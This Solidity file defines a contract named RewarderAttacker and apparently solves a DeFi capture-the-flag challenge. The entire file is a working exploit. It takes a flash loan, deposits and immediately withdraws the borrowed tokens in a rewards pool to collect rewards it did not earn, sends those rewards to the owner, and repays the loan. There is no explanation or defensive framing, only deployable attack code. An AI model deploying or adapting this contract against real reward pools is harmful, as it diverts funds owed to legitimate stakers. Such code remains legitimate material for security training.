//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
    function liquidityToken() external view returns (address);
}

interface IRewarder {
    function rewardToken() external view returns (address);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract RewarderAttacker {
    address private loanPool;
    address private rewardsPool;
    address private owner;

    constructor(address _loanPool, address _rewardsPool, address _owner) {
        loanPool = _loanPool;
        rewardsPool = _rewardsPool;
        owner = _owner;
    }

    function takeLoan(uint256 amount) external {
        IFlashLoanerPool(loanPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20(IFlashLoanerPool(loanPool).liquidityToken()).approve(rewardsPool, amount);
        (bool success, ) = rewardsPool.call(abi.encodeWithSignature("deposit(uint256)", amount));
        require(success, "deposit failed");
        (success, ) = rewardsPool.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "withdraw failed");
        IERC20(IRewarder(rewardsPool).rewardToken()).transfer(owner, IERC20(IRewarder(rewardsPool).rewardToken()).balanceOf(address(this)));
        IERC20(IFlashLoanerPool(loanPool).liquidityToken()).transfer(loanPool, amount);
    }

    
}